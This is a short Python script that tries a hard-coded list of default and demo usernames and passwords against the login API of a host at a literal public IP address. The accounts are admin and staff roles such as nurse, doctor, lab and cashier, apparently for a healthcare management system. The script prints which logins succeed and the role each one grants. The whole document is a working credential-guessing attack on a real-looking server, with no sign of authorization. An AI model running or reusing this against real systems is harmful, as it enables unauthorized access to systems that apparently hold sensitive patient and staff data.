import urllib.request
import json

creds = [
    ("admin", "Admin12345!"),
    ("admin", "admin"),
    ("admin", "Admin2026!"),
    ("demo_admin1", "Admin2026!"),
    ("demo_frontdesk1", "FrontDesk2026!"),
    ("demo_nurse1", "Nurse2026!"),
    ("demo_dr1", "Doctor2026!"),
    ("demo_lab1", "Lab2026!"),
    ("demo_rad1", "Rad2026!"),
    ("demo_cashier1", "Cashier2026!"),
    ("demo_auditor1", "Auditor2026!"),
]

for username, password in creds:
    data = json.dumps({"username": username, "password": password}).encode("utf-8")
    req = urllib.request.Request("http://34.7.237.8/api/auth/login", data=data, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req) as resp:
            body = json.loads(resp.read().decode())
            print(f"[SUCCESS] {username}:{password} -> {body.get('user', {}).get('role')}")

    except urllib.error.HTTPError as e:
        print(f"[FAIL {e.code}] {username}:{password}")
    except Exception as e:
        print(f"[ERROR] {username}:{password} -> {e}")

